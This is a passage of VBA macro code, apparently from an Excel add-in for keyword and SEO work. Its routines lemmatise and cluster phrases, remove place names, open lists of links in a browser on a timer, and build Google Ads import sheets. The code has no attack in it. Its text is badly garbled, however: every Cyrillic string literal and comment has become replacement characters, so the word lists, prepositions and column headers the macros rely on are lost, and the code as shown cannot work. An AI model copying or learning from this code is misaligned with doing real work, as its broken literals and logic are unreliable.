"|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "1|fffd|", "3|fffd|")
    a = Array("b", "c", "d", "f", "g", "h", "j", "k", "l", "m", "n", "p", "q", "r", "s", "t", "v", "w", "x", "z", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|")
    b = Array("a", "e", "i", "o", "u", "y", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|")
Set dict = CreateObject("Scripting.Dictionary") ' sozdayem i napolnyayem slovar glasnymi-soglasnymi i isklyuchyeniyami
    For i = LBound(a) To UBound(a)
        dict.Add (a(i)), True
    Next
    For j = LBound(b) To UBound(b)
        dict.Add (b(j)), False
    Next
    For k = LBound(exc) To UBound(exc)
        dict.Add (exc(k)), True
    Next
Dim arr() As Boolean
Dim arr2() As String
Dim arrSheet()
If Selection.Count > 1 Then
arrSheet = Selection.Value2
Else:
arrSheet = Range(Selection, Selection.Offset(0, 1)).Value2
End If
    For q = LBound(arrSheet) To UBound(arrSheet):
        arr2() = Split(arrSheet(q, 1))
        strg = ""
        For i = LBound(arr2) To UBound(arr2)
                On Error Resume Next
                x = Len(arr2(i))
                ReDim arr(x)
                For j = 1 To x
                    arr(j) = Replace(Mid$(LCase$(arr2(i)), j, 1), Mid$(LCase$(arr2(i)), j, 1), dict(Mid$(LCase$(arr2(i)), j, 1)))
                    Next
                z = Application.WorksheetFunction.And(arr)
                w = Application.WorksheetFunction.Or(arr)
                ReDim Preserve arr(x)
                y = Application.WorksheetFunction.And(arr)
                v = Application.WorksheetFunction.Or(arr)
                If (z = True Or w = False) And x > 2 Or z = True And x = 2 Or x > 3 And (y = True Or v = False) Or dict.exists(arr2(i)) And x > 1 Then
                    strg = strg & UCase$(arr2(i)) & " "
                ElseIf Err <> 0 Then strg = strg & arr2(i) & " "
                Else: strg = strg & arr2(i) & " "
                End If
                Erase arr
        Next i
    arrSheet(q, 1) = WStrim(strg)
    Next q
Selection.Value2 = arrSheet
OptimizeOFF
End Sub
Sub QuickSort(vArray As Variant, inLow As Long, inHi As Long)
  Dim Pivot   As Variant
  Dim tmpSwap As Variant
  Dim tmpLow  As Long
  Dim tmpHi   As Long
  tmpLow = inLow
  tmpHi = inHi
  Pivot = vArray((inLow + inHi) \ 2)
  While (tmpLow <= tmpHi)
     While (vArray(tmpLow) < Pivot And tmpLow < inHi)
        tmpLow = tmpLow + 1
     Wend
     While (Pivot < vArray(tmpHi) And tmpHi > inLow)
        tmpHi = tmpHi - 1
     Wend
     If (tmpLow <= tmpHi) Then
        tmpSwap = vArray(tmpLow)
        vArray(tmpLow) = vArray(tmpHi)
        vArray(tmpHi) = tmpSwap
        tmpLow = tmpLow + 1
        tmpHi = tmpHi - 1
     End If
  Wend
  If (inLow < tmpHi) Then QuickSort vArray, inLow, tmpHi
  If (tmpLow < inHi) Then QuickSort vArray, tmpLow, inHi
End Sub
Sub sobrat_stolbtsy_v_odin()
Dim lastrow As Long
Dim iLastRow As Long
Dim lastColumn As Long
Dim i As Long
OptimizeON
lastColumn = Cells(1, Columns.Count).End(xlToLeft).Column
iLastRow = 0
   For i = 1 To lastColumn
      lastrow = Cells(Rows.Count, i).End(xlUp).Row
      Set rng = Range(Cells(1, i), Cells(lastrow, i))
      Range(Cells(1, i), Cells(lastrow, i)).Copy Cells(iLastRow + 1, lastColumn + 2)
      iLastRow = Cells(Rows.Count, lastColumn + 2).End(xlUp).Row
   Next
OptimizeOFF
End Sub

Sub Get_lemmDict()
Dim link As String
link = "https://semtools.guru/dl/ru/lemms.xlsb"
Dim wbk As Workbook, i As Long
i = 0
For Each wbk In Workbooks
If wbk.name = "lemms.xlsb" Then
i = i + 1
Else:
i = i
End If
Next
If i = 0 Then
Set wbk = Workbooks.Open(Filename:=link)
ActiveWindow.ActivatePrevious
End If
End Sub
Sub arrlemmthroughdict()
Dim x As Variant, txt As String, i As Long, r As Long, dict As Object
Dim a()
OptimizeON
selector
    a = Selection.Value2
    Set dict = CreateObject("Scripting.Dictionary")
For r = LBound(a) To UBound(a):
    x = Split(a(r, 1), " ")
        For i = LBound(x) To UBound(x)
            If dict.exists(x(i)) Then
            x(i) = dict.item(x(i))
            Else
            dict.Add x(i), lemmatstr(CStr(x(i)))
            x(i) = dict.item(x(i))
            End If
            a(r, 1) = Join(x, " ")
        Next
Next
    Selection.Value2 = a
OptimizeOFF
End Sub

Sub Del_list_rng_phrases(UserRange As Range)
Dim x As Variant, i As Long, r As Long, dict As Object, deleted As Object
Dim w()
Dim a()
OptimizeON
    a = UserRange.Value2
    w = Selection.Value2
    Set deleted = CreateObject("Scripting.Dictionary")
    Set dict = CreateObject("Scripting.Dictionary")
        For r = LBound(a) To UBound(a)
        If deleted.exists(UCase$(a(r, 1))) Then Else deleted.Add UCase$(a(r, 1)), False
        Next
For r = LBound(w) To UBound(w):
    x = Split(w(r, 1), " ")
        For i = LBound(x) To UBound(x)
            If dict.exists(x(i)) Then
            ElseIf deleted.exists(UCase$(x(i))) Then
            x(i) = ""
            Else:
            dict.Add x(i), False
            End If
        Next
    w(r, 1) = WStrim(Join(x, " "))
Next r
    Selection.Value2 = w
OptimizeOFF
End Sub
Sub udalit_toponimy_s_pryedlogami(Optional en As Boolean = False)
Dim delim As String, r As Long, i As Long, j As Long, k As Long, dict As Object, dictPreps As Object, tmpstr As String, wrdarr() As String
Dim phr(), arr(), x As Long, wrd As String, phrEnds() As String
Dim b()
Dim c()
OptimizeON
selector
If Selection.Count = 1 Then Exit Sub Else arr() = Selection.Value2
If en = True Then
    b = Array("IN", "AT", "BY", "TO")
Else
    b = Array("|fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd|", "|fffd|")
End If
Set dictPreps = CreateObject("Scripting.Dictionary")
For i = LBound(b) To UBound(b)
    dictPreps.Add (b(i)), False
Next
    phr = abc.Range("GEO_Toponyms").Value2
    delim = vbTab
    Set dict = CreateObject("Scripting.Dictionary")

    For r = LBound(phr) To UBound(phr)
        tmpstr = extrFirstWord(CStr(phr(r, 1)))
            If dict.exists(UCase(tmpstr)) Then
                   dict.item(UCase(tmpstr)) = dict.item(UCase(tmpstr)) & delim & phr(r, 1)
            Else:
                   dict.Add UCase(tmpstr), phr(r, 1)
            End If
    Next r

For i = LBound(arr) To UBound(arr)
    wrdarr = Split(arr(i, 1) & " ", " ")
    wrd = arr(i, 1)
    tmpstr = ""
    For j = LBound(wrdarr) To UBound(wrdarr) - 2
        If dictPreps.exists(UCase(wrdarr(j))) Then
            If dict.exists(UCase(wrdarr(j + 1))) Then
                If UCase(dict.item(UCase(wrdarr(j + 1)))) = UCase(wrdarr(j + 1)) Then
                    wrd = Replace(" " & wrd & " ", " " & wrdarr(j) & " " & wrdarr(j + 1) & " ", " ", , , vbTextCompare)
                Else
                    phrEnds = Split(dict.item(UCase(wrdarr(j + 1))), delim)
                    For k = LBound(phrEnds) To UBound(phrEnds)
                        If InStr(1, " " & wrd & " ", " " & wrdarr(j) & " " & phrEnds(k) & " ", vbTextCompare) > 0 Then
                        wrd = Replace(" " & wrd & " ", " " & wrdarr(j) & " " & phrEnds(k) & " ", " ", , , vbTextCompare)
                        Exit For
                        Else
                        End If
                    Next k
                End If
            Else
            End If
        Else
        End If
    Next j
arr(i, 1) = WStrim(wrd)
Next i
Selection.Value2 = arr
OptimizeOFF
End Sub
Sub extrTopsWithPreps(Optional en As Boolean = False)
Dim delim As String, r As Long, i As Long, j As Long, k As Long, dict As Object, dictPreps As Object, tmpstr As String, wrdarr() As String
Dim phr(), arr(), x As Long, wrd As String, phrEnds() As String
Dim b()
Dim c()
OptimizeON
selector
If Selection.Count = 1 Then Exit Sub Else arr() = Selection.Value2
If en = True Then
    b = Array("IN", "AT", "BY", "TO")
Else
    b = Array("|fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd|", "|fffd|")
End If
Set dictPreps = CreateObject("Scripting.Dictionary")
For i = LBound(b) To UBound(b)
    dictPreps.Add (b(i)), False
Next
    phr = abc.Range("GEO_Toponyms").Value2
    delim = vbTab
    Set dict = CreateObject("Scripting.Dictionary")

    For r = LBound(phr) To UBound(phr)
        tmpstr = extrFirstWord(CStr(phr(r, 1)))
            If dict.exists(UCase(tmpstr)) Then
                   dict.item(UCase(tmpstr)) = dict.item(UCase(tmpstr)) & delim & phr(r, 1)
            Else:
                   dict.Add UCase(tmpstr), phr(r, 1)
            End If
    Next r

For i = LBound(arr) To UBound(arr)
    wrdarr = Split(arr(i, 1) & " ", " ")
    wrd = arr(i, 1)
    tmpstr = ""
    For j = LBound(wrdarr) To UBound(wrdarr) - 1
        If dictPreps.exists(UCase(wrdarr(j))) Then
            If dict.exists(UCase(wrdarr(j + 1))) Then
                If UCase(dict.item(UCase(wrdarr(j + 1)))) = UCase(wrdarr(j + 1)) Then
                    wrdarr(j) = wrdarr(j) & " " & wrdarr(j + 1)
                Else
                    phrEnds = Split(dict.item(UCase(wrdarr(j + 1))), delim)
                    For k = LBound(phrEnds) To UBound(phrEnds)
                        If InStr(1, " " & wrd & " ", " " & wrdarr(j) & " " & phrEnds(k) & " ", vbTextCompare) > 0 Then
                        wrdarr(j) = wrdarr(j) & " " & phrEnds(k)
                        Exit For
                        Else
                        End If
                    Next k
                    If InStr(1, wrdarr(j), " ") > 0 Then Else wrdarr(j) = ""
                End If
            Else
            wrdarr(j) = ""
            End If
        Else
        wrdarr(j) = ""
        End If
    Next j
arr(i, 1) = WStrim(Join(wrdarr, " "))
Next i
Selection.Value2 = arr
OptimizeOFF
End Sub
Sub remBlankRows()
ActiveSheet.UsedRange.Select
Dim i As Long
OptimizeON
For i = Selection.Rows.Count To 1 Step -1
If WorksheetFunction.CountA(Selection.Rows(i)) = 0 Then
Selection.Rows(i).EntireRow.Delete
End If
Next i
OptimizeOFF
End Sub
Sub remBlankColumns()
ActiveSheet.UsedRange.Select
Dim i As Long
OptimizeON
For i = Selection.Columns.Count To 1 Step -1
If WorksheetFunction.CountA(Selection.Columns(i)) = 0 Then
Selection.Columns(i).EntireColumn.Delete
End If
Next i
OptimizeOFF
End Sub
Sub Clusterize()
Dim i As Long, x As Long, dict As Object, tmpmax As Long, pivotDict As Object, pivotDict2 As Object, tmpstr As String, arr(), wc As Long, a() As String
OptimizeON
Set dict = CreateObject("Scripting.Dictionary")
arr = Selection.Value2
delWordsArrFromPhrases2dimArr Split(stopwords()), arr
For x = LBound(arr) To UBound(arr)
    a = Split(remRepWords(sortInCellAZ(CStr(arr(x, 1)))) & " ")
        For i = LBound(a) To UBound(a) - 1
            tmpstr = a(i)
            If dict.exists(tmpstr) Then dict.item(tmpstr) = dict.item(tmpstr) + 1 Else dict.Add tmpstr, 1
        Next i
Next x
wc = Application.InputBox("granulyarnost (chastota upotryeblyeniy) - ot 2 do " & Application.Max(dict.Items) & _
vbCrLf & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbCrLf & "sryednyeye:" & Round(Application.Average(dict.Items), 2) & vbCrLf & "myediana:" & Application.Median(dict.Items), "", Type:=1)
For x = LBound(arr) To UBound(arr)
    a = Split(WStrim(arr(x, 1)) & " ")
        For i = LBound(a) To UBound(a) - 1
            tmpstr = a(i)
            If dict.item(tmpstr) < wc Then a(i) = ""
        Next i
    arr(x, 1) = WStrim(Join(a, " "))
Next x
'izbavlyayemsya ot grupp s 1 |fffd|lyemyentom
'    Set pivotDict = CreateObject("Scripting.Dictionary")
'    Set pivotDict2 = CreateObject("Scripting.Dictionary")
'    For x = LBound(arr) To UBound(arr):
'        If pivotDict.exists(CStr(arr(x, 1))) Then
'            pivotDict.item(CStr(arr(x, 1))) = pivotDict.item(CStr(arr(x, 1))) + 1
'        Else
'            pivotDict.Add CStr(arr(x, 1)), 1
'        End If
'    Next x
'    For Each Key In pivotDict.Keys
'            If pivotDict.item(Key) > 1 Then
'            pivotDict2.Add Key, True
'            End If
'    Next
'For x = LBound(arr) To UBound(arr)
'            If pivotDict.item(CStr(arr(x, 1))) = 1 Then
'                arr(x, 1) = firstClosestParent(CStr(arr(x, 1)), pivotDict2.Keys)
'            End If
'Next x
Selection.Offset(0, 1).Value2 = arr
OptimizeOFF
End Sub
Sub extr_list_rng(UserRange As Range)
Dim x As Variant, i As Long, r As Long, find As Object, dict As Object
Dim w()
Dim a()
OptimizeON
    a = UserRange.Value2
    w = Selection.Value2
    Set find = CreateObject("Scripting.Dictionary")
    Set dict = CreateObject("Scripting.Dictionary")
        For r = LBound(a) To UBound(a)
        If find.exists(UCase$(a(r, 1))) Then Else find.Add UCase$(a(r, 1)), False
        Next
For r = LBound(w) To UBound(w):
    x = Split(w(r, 1), " ")
        For i = LBound(x) To UBound(x)
            If dict.exists(x(i)) Then
            x(i) = ""
            ElseIf find.exists(UCase$(x(i))) Then
            Else:
            dict.Add x(i), False
            x(i) = ""
            End If
    w(r, 1) = WStrim(Join(x, " "))
        Next
Next
    Selection.Value2 = w
OptimizeOFF
End Sub
Sub extrWordsPatternListMatchAny(rng As Range)
Dim a(), a2(), i As Long, j As Long, k As Long, x As Variant
a = Selection.Value2
a2 = rng.Value2
    For i = LBound(a) To UBound(a)
        x = Split(a(i, 1) & " ", " ")
        For k = LBound(x) To UBound(x) - 1
            For j = LBound(a2) To UBound(a2)
                If InStr(1, UCase(x(k)), UCase(a2(j, 1))) > 0 Then
                Exit For
                Else:
                If j = UBound(a2) Then x(k) = ""
                End If
            Next j
        Next k
        a(i, 1) = Application.WorksheetFunction.Trim(Join(x, " "))
    Next i
Selection.Value2 = a
End Sub
Sub extr_list_1DimArr(arr)
Dim x As Variant, i As Long, r As Long, find As Object, dict As Object
Dim w()
Dim a()
OptimizeON
If Selection.Count = 1 Then Exit Sub
    w = Selection.Value2
    Set find = CreateObject("Scripting.Dictionary")
    Set dict = CreateObject("Scripting.Dictionary")
        For r = LBound(arr) To UBound(arr)
            find.Add UCase$(arr(r)), False
        Next
For r = LBound(w) To UBound(w):
    x = Split(w(r, 1), " ")
        For i = LBound(x) To UBound(x)
            If dict.exists(x(i)) Then
            x(i) = ""
            ElseIf find.exists(UCase$(x(i))) Then
            Else:
            dict.Add x(i), False
            x(i) = ""
            End If
    w(r, 1) = WStrim(Join(x, " "))
        Next
Next
    Selection.Value2 = w
OptimizeOFF
End Sub
Sub sortSelection()
With ActiveSheet.Sort
    .SortFields.Clear
    .SortFields.Add Key:=Selection.Columns(1), order:=xlAscending
    .MatchCase = True
    .SetRange Selection
    .Apply
End With
End Sub
Sub callWebPage(url As String)
    ActiveWorkbook.FollowHyperlink _
    Address:=url, _
    NewWindow:=True, _
    AddHistory:=True
End Sub
Public Sub obkhodstranitsyabro()
Dim a(), i As Long, interval As String, links As Range, tabsToKill As Long
Set links = Application.InputBox(Prompt:="vybyeritye massiv ssylok (1 stolbyets)", title:="ssylki:", Type:=8)
interval = "0:00:0" & Application.InputBox("vvyeditye intyerval otkrytiya ssylok (ot 1 do 9 syekund)", "intyerval", Type:=2)
tabsToKill = Application.InputBox("vvyeditye kak chasto ubivat brauzyer (kolichyestvo otkrytykh vkladok)", "kolichyestvo vkladok", Type:=1)
a = links.Value2
For i = LBound(a) To UBound(a)
Err.Clear
On Error Resume Next
Application.Wait (Now + TimeValue(interval))
    If i Mod tabsToKill = 0 Then
        Application.Wait (Now + TimeValue("0:00:03"))
        TerminateProcess ("browser.exe")
        Application.Wait (Now + TimeValue("0:00:02"))
        Else:
    End If
callWebPage (a(i, 1))
Next i
End Sub

Sub getHTTPCode()
UDFArr "GetHttpResult"
End Sub
Private Sub TerminateProcess(app_exe As String)
    Dim Process As Object
    On Error Resume Next
    For Each Process In GetObject("winmgmts:").ExecQuery("Select Name from Win32_Process Where Name = '" & app_exe & "'")
        Process.Terminate
    Next
    Err.Clear
End Sub
Sub errcheck()
    If Err <> 0 Then
    MsgBox "chto-to poshlo nye tak"
    Exit Sub
    End If
End Sub
Sub DirectToAdWords(control As IRibbonControl)
Dim i As Long
Dim inp()
Dim tArr() As String
Dim tArr2() As String
Dim tArr3() As String
Dim strg As String
Dim sName As String
sName = ActiveSheet.name
OptimizeON
'--------------------------------------------------------------------------------------------------
'|fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd|
sName = ActiveSheet.name
On Error GoTo ErrorHandler
findSelectFirst ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
Range(Selection, Selection.End(xlDown)).Select
inp = Selection.Value2
findSelectFirst ("|fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)")
errcheck
For i = LBound(inp) To UBound(inp):
inp(i, 1) = inp(i, 1) & "\" & Replace(Selection.Offset(i - 1, 0).Value2, " -", vbTab)
Next i
On Error Resume Next
findSelectFirst ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
If Err <> 0 Then
    For i = LBound(inp) To UBound(inp):
    inp(i, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1\" & inp(i, 1)
    Next i
Else:
    For i = LBound(inp) To UBound(inp):
    inp(i, 1) = Selection.Offset(i - 1, 0).Value2 & "\" & inp(i, 1)
    Next i
End If
unpivotArr inp, vbTab, "Negative"
Range("A1").Value = "Campaign\Ad group\Ad group (SKAG)"
Range("B1").Value = "Keyword"
    Columns("B:C").Select
    Selection.Insert Shift:=xlToRight
Columns("A:A").Select
Selection.TextToColumns Destination:=Range("A1"), DataType:=xlDelimited, _
        TextQualifier:=xlNone, ConsecutiveDelimiter:=False, Tab:=False, _
        Semicolon:=False, Comma:=False, Space:=False, Other:=True, OtherChar _
        :="\", FieldInfo:=Array(Array(1, 1), Array(2, 1), Array(3, 1)), _
        TrailingMinusNumbers:=True
selectAllUnder ("Keyword")
UDFArr ("remMdf")
UDFArr ("vkavychki")
Err.Clear
Worksheets(sName).Select
Cells.find(What:="|fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
    xlNext, MatchCase:=False).Offset(0, 1).Select
If Err <> 0 Then '|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd| XLSX, |fffd||fffd||fffd||fffd| |fffd| CSV
    For i = LBound(inp) To UBound(inp):
    inp(i, 1) = Left(inp(i, 1), InStr(1, inp(i, 1), "\") - 1) & Replace(" " & Cells.find(What:="|fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
    xlNext, MatchCase:=False).Offset(i, 0).Value2, " -", vbTab)
    Next i
unpivotArr inp, vbTab, "CampaignNegative"
Else:
inp = Range(Selection, Selection.Offset(0, 1)).Value2
inp(1, 1) = Replace("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1" & " " & inp(1, 1), " -", vbTab)
unpivotArr inp, vbTab, "CampaignNegative"
End If
Range("A1").Value = "Campaign"
Range("B1").Value = "Keyword"
selectAllUnder ("Keyword")
UDFArr ("remMdf")
UDFArr ("vkavychki")
'--------------------------------------------------------------------------------------------------
'|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Worksheets(sName).Select
findSelectFirst ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
Range(Selection, Selection.End(xlDown)).Select
inp = Selection.Value2
ReDim tArr3(UBound(inp))
Err.Clear
findSelectFirst ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
If Err <> 0 Then
For i = LBound(inp) To UBound(inp):
tArr3(i) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1" & vbTab & inp(i, 1) & vbTab & Cells.find(What:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2 & vbTab & Cells.find(What:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2 & vbTab & Cells.find(What:="|fffd||fffd||fffd||fffd||fffd|", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2 & vbTab & Cells.find(What:="|fffd||fffd||fffd||fffd||fffd||fffd|", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2
Next i
Else:
For i = LBound(inp) To UBound(inp):
tArr3(i) = Cells.find(What:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2 & vbTab & inp(i, 1) & vbTab & Cells.find(What:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2 & vbTab & Cells.find(What:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2 & vbTab & Cells.find(What:="|fffd||fffd||fffd||fffd||fffd|", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2 & vbTab & Cells.find(What:="|fffd||fffd||fffd||fffd||fffd||fffd|", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2
Next i
End If
With Worksheets.Add
        .name = "Ads"
        .[a1].Value2 = "Campaign" & vbTab & "Ad Group" & vbTab & "Headline 1" & vbTab & "Headline 2" & vbTab & "Description" & vbTab & "Final URL"
        .[a2].Resize(UBound(tArr3), 1) = Application.Transpose(tArr3)
End With
Columns(1).TextToColumns Destination:=Range("A1"), DataType:=xlDelimited, TextQualifier:=xlNone, ConsecutiveDelimiter:=False, Tab:=True, _
    FieldInfo:=Array(Array(1, 2), Array(2, 2), Array(3, 2)), _
    TrailingMinusNumbers:=True
    Columns("A:E").EntireColumn.AutoFit
Erase inp
Erase tArr3
'--------------------------------------------------------------------------------------------------
'|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Worksheets(sName).Select
findSelectFirst ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
Range(Selection, Selection.End(xlDown)).Select
inp = Selection.Value2
ReDim tArr3(UBound(inp))
On Error Resume Next
findSelectFirst ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
If Err <> 0 Then
For i = LBound(inp) To UBound(inp):
tArr3(i) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1" & "\" & inp(i, 1) & "\" & Cells.find(What:="|fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2
Next i
Else:
For i = LBound(inp) To UBound(inp):
tArr3(i) = Cells.find(What:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2 & "\" & inp(i, 1) & "\" & Cells.find(What:="|fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
xlNext, MatchCase:=False).Offset(i, 0).Value2
Next i
End If
With Worksheets.Add
        .name = "KeyWords"
        .[a1].Value2 = "Campaign\Ad Group\Keyword"
        .[a2].Resize(UBound(tArr3), 1) = Application.Transpose(tArr3)
End With
Columns(1).TextToColumns Destination:=Range("A1"), DataType:=xlDelimited, TextQualifier:=xlNone, ConsecutiveDelimiter:=False, Tab:=False, _
    Semicolon:=False, Comma:=False, Space:=False, Other:=True, OtherChar:="\", FieldInfo:=Array(Array(1, 2), Array(2, 2), Array(3, 2)), _
    TrailingMinusNumbers:=True
Columns(3).Replace What:=" -*", Replacement:="", LookAt:=xlPart
Columns("A:C").EntireColumn.AutoFit
selectAllUnder ("Keyword")
UDFArr "KWD_YDtoGA"
ActiveWorkbook.Sheets("KeyWords").Tab.Color = 5287936
ActiveWorkbook.Sheets("Ads").Tab.Color = 5287936
ActiveWorkbook.Sheets("Negative").Tab.Color = 5287936
ActiveWorkbook.Sheets("CampaignNegative").Tab.Color = 5287936
OptimizeOFF
Exit Sub
ErrorHandler:
  MsgBox ("|fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|")
Ends:
OptimizeOFF
End Sub
'''''''''''''''''''''''''''''''''
'F U N C T I O N S
'''''''''''''''''''''''''''''''''
Sub Pause(ByVal Delay As Double)
  Dim dblEndTime As Double
  dblEndTime = Timer + Delay
  Do While Timer < dblEndTime
    DoEvents
  Loop
End Sub
'cells - base
Private Function vOnAnyFromList(fnname As String, strArg As String, rng As Range) As Boolean
Dim arr(), i As Long
arr = rng.Value2
vOnAnyFromList = False
    For i = LBound(arr) To UBound(arr)
        If Application.Run(fnname, strArg, CStr(arr(i, 1))) = True Then
        vOnAnyFromList = True
        Exit For
        Else:
        End If
    Next i
End Function
Private Function vOnAllFromList(fnname As String, strArg As String, rng As Range) As Boolean
Dim arr(), i As Long
arr = rng.Value2
vOnAllFromList = True
    For i = LBound(arr) To UBound(arr)
        If Application.Run(fnname, strArg, CStr(arr(i, 1))) = False Then
        vOnAllFromList = False
        Exit For
        Else:
        End If
    Next i
End Function
Private Function remValid(fnname As String, x As String) As String
If Application.Run(fnname, x) = True Then remValid = "" Else remValid = x
End Function
Private Function remV2PL(fnname As String, x As String, l As Long) As String
If Application.Run(fnname, x, l) = True Then remV2PL = "" Else remV2PL = x
End Function
Private Function remV2PS(fnname As String, x As String, s As String) As String
If Application.Run(fnname, x, s) = True Then remV2PS = "" Else remV2PS = x
End Function
Private Function remV2PRng(fnname As String, x As String, rng As Range) As String
If Application.Run(fnname, x, rng) = True Then remV2PRng = "" Else remV2PRng = x
End Function
Private Function extrValid(fnname As String, x As String) As String
If Application.Run(fnname, x) = True Then extrValid = x Else extrValid = ""
End Function
Private Function extrV2PL(fnname As String, x As String, l As Long) As String
If Application.Run(fnname, x, l) = True Then extrV2PL = x Else extrV2PL = ""
End Function
Private Function extrV2PS(fnname As String, x As String, s As String) As String
If Application.Run(fnname, x, s) = True Then extrV2PS = x Else extrV2PS = ""
End Function
Private Function extrV2PRng(fnname As String, x As String, rng As Range) As String
If Application.Run(fnname, x, rng) = True Then extrV2PRng = x Else extrV2PRng = ""
End Function
'Words - base
Private Function exOnWords(fnname As String, x As String) As String
Dim arr() As String, i As Long
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    arr(i) = Application.Run(fnname, CStr(arr(i)))
Next i
